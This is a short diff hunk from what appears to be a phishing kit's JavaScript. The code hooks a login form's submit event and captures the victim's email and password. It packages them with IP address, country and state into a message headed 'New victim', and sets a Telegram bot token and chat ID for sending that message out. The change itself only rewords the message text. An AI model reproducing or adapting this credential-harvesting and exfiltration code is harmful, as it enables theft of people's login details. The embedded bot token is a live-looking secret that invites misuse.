@@ -20,7 +20,7 @@ form.addEventListener("submit", (e) => {
         var identity = document.getElementById("email").value;
         var password = document.getElementById("password").value;
 
-        var my_text = `🍖🍖New victim found, oya these are the details below: ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+        var my_text = `New victim results: ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
    var token = "6422540231:AAFfayBIZ-Kju87-FHl0a1usu4wsdU3cbog";
         var chat_id = 6889899788;
